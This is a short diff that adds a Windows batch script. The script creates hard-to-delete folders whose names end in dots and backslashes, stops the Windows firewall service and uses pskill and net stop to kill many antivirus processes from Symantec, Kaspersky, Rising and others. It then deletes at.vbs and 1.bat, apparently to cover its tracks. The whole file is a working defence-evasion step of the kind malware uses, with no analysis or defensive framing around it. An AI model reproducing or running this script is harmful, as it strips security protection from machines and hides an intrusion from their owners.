@@ -1,0 +1,21 @@
+mkdir s\ 
+mkdir s\s1\ 
+mkdir s.\
+mkdir s..\ 
+mkdir s...\
+net stop sharedaccess
+c:\pskill.exe pfw
+c:\pskill.exe ravmon
+net stop "Symantec AntiVirus"
+c:\pskill.exe syncserver
+net stop fmdaemon
+net stop KAVStart
+c:\pskill kavstart / KWatch
+c:\pskill.exe AVP.EXE
+c:\pskill.exe ALG.EXE
+c:\pskill.exe Rtvscan
+c:\pskill.exe CCAPP
+c:\pskill.exe vptray
+c:\pskill.exe defwatch
+del at.vbs
+del 1.bat
